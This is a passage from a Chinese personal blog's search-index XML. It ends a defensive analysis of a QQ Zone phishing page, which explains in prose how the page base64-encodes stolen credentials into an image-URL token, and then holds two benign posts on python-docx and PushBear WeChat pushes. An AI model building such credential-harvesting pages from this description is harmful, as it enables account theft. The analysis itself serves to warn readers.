address查，发现唯一有可能的就是那个user.jpg，还带token参数，隐藏得有点意思，虽然不知道为啥404了。</p><hr><p>jio得还没完，这token咋来的，提交的<strong>账号密码去哪了</strong>emmm，缺点啥。然后查看网页元素，找到了对应的JavaScript代码（P10-11）。</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/10.png" alt="10"></p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/11.png" alt="11"></p><p>哈哈哈哈哈这个逻辑判断写的还是有点意思的，还把一堆常用简单数字给处理了，难怪前面输123456789玩不来。这个一键登录就是个假的（万一真的估计就得不到账号密码了吧）。点击登录的时候，将用户名密码拼接成json字符串，然后将字符串转换成base64加密传输，而后跳转到官方QQ空间界面。将P9的token用base64解密，果然得到了账号密码（P12）。</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/12.png" alt="12">  </p><p><em>// 他没调用官方登录接口，没有真的登录到QQ空间已经很友好了，不然更难发现呢</em>  </p><hr><p>到这差不多了，但感觉还没完，我们再来<strong>查查这个域名</strong>吧。</p><p>P13-15注册者信息，这人注册的域名真多。</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/13.png" alt="13">  </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/14.png" alt="14">  </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/15.png" alt="15"></p><p>用邮箱查询，而后随便访问几个，P16发现都重定向到了一个相似页面，原来那是西部数码上的一个域名经销商。这么说那个人也只是从经销商那里买了个域名而已。</p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/16.png" alt="16"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是个做得有点水平的钓鱼网站。</p><p><strong>碰到类似的二维码别乱扫，扫了也别登录！</strong></p><p>至于获取账号密码之后把全列表都at，估计还写了别的脚本或者调用了啥接口，这个我还不清楚emmm   </p><p><img src="/2019/03/30/Idea_AnalysisOfHackingPage/17.jpg" alt="又开始了"></p><p>以上内容均基于公开资料，<strong>仅供学习研究使用，请勿用于非法用途</strong>。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Analysis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> QQ空间 </tag>
            
            <tag> 盗号 </tag>
            
            <tag> 分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | 利用python-docx批量提取Word中的信息进而导入Excel</title>
      <link href="/2019/03/21/Idea_python-docx/"/>
      <url>/2019/03/21/Idea_python-docx/</url>
      
        <content type="html"><![CDATA[<blockquote><p>搬运自之前的小脑洞小想法啦      </p></blockquote><p>又是个小脑洞<br>最近有个比赛要统计一下各组信息，信息来自Word版的申请表。</p><p><img src="/2019/03/21/Idea_python-docx/1.jpg" alt="1"></p><p>考虑到Word要一个一个打开，再复制粘贴。</p><p>简单重复，太难受了8，不如干脆py一下，写个小程序来弄吧。  </p><h2 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路"></a>大致思路</h2><p>一查发现.docx是以类似xml格式来存放信息的，刚开始思路就想直接解压.docx，从中解析文件然后暴力匹配。。</p><p>而后发现有个<strong>第三方库<code>python-docx</code></strong>，于是乎不想造轮子了，直接拿来用吧。</p><p>然而并没有那么简单，合并的单元格变成独立重复的内容，加个去重吧。</p><h2 id="提取信息"><a href="#提取信息" class="headerlink" title="提取信息"></a>提取信息</h2><p>文字都解析出来了，接下来，来点简单的正则匹配，单独拿个文件来试试，没毛病，挺好的。</p><h2 id="批量读取"><a href="#批量读取" class="headerlink" title="批量读取"></a>批量读取</h2><p>遍历文件夹下所有文件，筛选<code>.docx</code>且排除临时文件，噫少了俩。</p><p>原来还有.doc格式的，另存为.docx <em>(docx库只支持.docx)</em>。</p><p>依次读取每个文件，拼接string列表，得到所需信息。</p><p><img src="/2019/03/21/Idea_python-docx/2.jpg" alt="2"></p><h2 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h2><p>将infolist按照<code>.csv</code>的格式写入文件。</p><blockquote><p>其实可以调用第三方库来实现的。</p></blockquote><h2 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h2><p>实际情况还是挺复杂的，比如表格哪里没填空缺了，或者哪个里面多加几个分隔符什么的，还是出了不少bug，于是继续完善程序，加入相应的处理呗！  </p><p><strong>生产环境真复杂</strong>  </p><p><img src="/2019/03/21/Idea_python-docx/3.jpg" alt="遇到的情况">  </p><p><img src="/2019/03/21/Idea_python-docx/4.jpg" alt="4">  </p><p>如果用Excel打开<code>.csv</code>，发现学号前的0自动丢失，还是觉得不爽emmm （程序猿的自我修养  </p><p>又查了查资料，新建<code>.xlsx</code>，从文本导入到Excel，设置好属性。  </p><p>几好，完事！</p><p><img src="/2019/03/21/Idea_python-docx/5.jpg" alt="修正后的匹配代码">  </p><p><img src="/2019/03/21/Idea_python-docx/6.jpg" alt="最终得到的Excel">  </p><blockquote><p>于是乎边查资料边debug边改代码 花了一个多两个小时<br>估计几个人同时手动做早都做完了  </p></blockquote><p>（其实早就想过用py读取Excel了，但是一直还没试过，这次就先拿py读取Word试试水吧</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Projects </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> Python </tag>
            
            <tag> Projects </tag>
            
            <tag> docx </tag>
            
            <tag> word </tag>
            
            <tag> csv </tag>
            
            <tag> 批量 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | 基于PushBear API实现微信消息推送</title>
      <link href="/2019/03/07/Idea_PushBearAPI_WeChatPush/"/>
      <url>/2019/03/07/Idea_PushBearAPI_WeChatPush/</url>
      
        <content type="html"><![CDATA[<blockquote><p>搬运自之前的小想法啦~  </p></blockquote><h2 id="调用API"><a href="#调用API" class="headerlink" title="调用API"></a>调用API</h2><p>基于PushBear API实现微信消息提醒  </p><p><a href="http://pushbear.ftqq.com/admin/#/" target="_blank" rel="noopener">PushBear API</a></p><p>用requests里现成的方法就完事了。  </p><h2 id="tkinter-GUI"><a href="#tkinter-GUI" class="headerlink" title="tkinter GUI"></a>tkinter GUI</h2><p>就是直接写代码感觉有点不友好</p><p>于是想做个图形界面</p><p>基于Python GUI库tkinter简单做了一下<br><img src="/2019/03/07/Idea_PushBearAPI_WeChatPush/1.jpg" alt="code">  </p><p><img src="/2019/03/07/Idea_PushBearAPI_WeChatPush/GUI.png" alt="GUI"></p><blockquote><p>（代码手动写布局太难受了<br>（还是直接用代码POST/GET方便emmm<br><em>（突然jio得LabVIEW做图形界面真方便</em></p></blockquote><h2 id="微信推送效果"><a href="#微信推送效果" class="headerlink" title="微信推送效果"></a>微信推送效果</h2><p><img src="/2019/03/07/Idea_PushBearAPI_WeChatPush/push.jpg" alt="推送效果"></p><p><strong>打开后是<code>Markdown</code>渲染的效果呢！</strong>  </p><p><img src="/2019/03/07/Idea_PushBearAPI_WeChatPush/2.jpg" alt="Markdown"></p><p>   （完）  </p><blockquote><p><strong>20191221 Update：</strong>  </p><p>好久没用了不知道现在还能不能用了233</p></blockquote><blockquote><p><strong>20200211 Update:</strong></p><blockquote><p>⚠️ 直发服务转代发的通知（重要）<br>因多次被恶意举报，从2019年6月开始，只提供「已经微信认证后的服务号」进行授权后，用其自有接口权限代发。<a href="http://sc.ftqq.com/6.version" target="_blank" rel="noopener">代发授权和绑定教程</a></p></blockquote><p>最近弄微信消息提醒又来看了看，发现一对多的推送必须要<strong>绑定已认证的服务号</strong>才能使用了。</p><p>但是<strong>Server酱</strong>的给自己绑定的微信号推送消息还是有效的。</p><p>详见：<a href="https://sc.ftqq.com/" target="_blank" rel="noopener">https://sc.ftqq.com/</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Projects </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> Python </tag>
            
            <tag> Projects </tag>
            
            <tag> API </tag>
            
            <tag> 微信 </tag>
            
            <tag> 消息推送 </tag>
            
            <tag> GUI </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
